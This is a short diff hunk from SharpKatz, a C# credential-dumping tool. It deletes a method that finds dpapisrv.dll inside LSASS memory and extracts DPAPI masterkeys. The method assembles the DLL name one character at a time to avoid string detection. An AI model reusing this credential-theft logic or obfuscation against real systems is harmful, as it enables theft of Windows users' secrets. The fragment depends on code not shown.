@@ -261,36 +261,5 @@ namespace SharpKatz.Module
             }
         }
 
-        /// <summary>
-        /// Standalone entry point - dump DPAPI masterkeys from LSASS
-        /// without requiring the full logon session pipeline
-        /// </summary>
-        public static int DumpMasterkeys(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey)
-        {
-            List<Logon> emptyLogonList = new List<Logon>();
-
-            // Get dpapisrv.dll base in LSASS
-            string sDpapisrv = new string(new char[] { 'd', 'p', 'a', 'p', 'i', 's', 'r', 'v', '.', 'd', 'l', 'l' });
-
-            IntPtr dpapisrvMem = IntPtr.Zero;
-            try
-            {
-                // Try to get module base - use the same mechanism as other modules
-                dpapisrvMem = Utility.GetModuleBaseAddress(hLsass, sDpapisrv);
-            }
-            catch
-            {
-                Console.WriteLine("   [-] Could not find dpapisrv.dll in LSASS");
-                return 0;
-            }
-
-            if (dpapisrvMem == IntPtr.Zero)
-            {
-                Console.WriteLine("   [-] dpapisrv.dll not loaded in LSASS");
-                return 0;
-            }
-
-            return FindCredentials(hLsass, dpapisrvMem, oshelper, iv, aeskey, deskey, emptyLogonList);
-        }
     }
 }
